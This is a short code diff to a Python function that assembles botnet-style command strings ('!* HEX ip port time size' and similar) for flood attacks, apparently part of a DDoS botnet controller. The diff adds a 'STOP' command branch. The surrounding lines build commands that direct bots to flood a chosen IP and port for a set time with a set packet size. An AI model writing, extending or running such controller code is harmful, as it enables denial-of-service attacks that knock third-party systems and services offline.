@@ -29,6 +29,8 @@ def run_command():
         command = "!* " + method + " " + ip + " " + port + " " + time + " 32 all " + size + " 10"
     elif(method == "HEX"):
         command = "!* " + method + " " + ip + " " + port + " " + time + " " + size
+    elif(method == "STOP"):
+        command = "!* STOP"
     
     print(command)
 
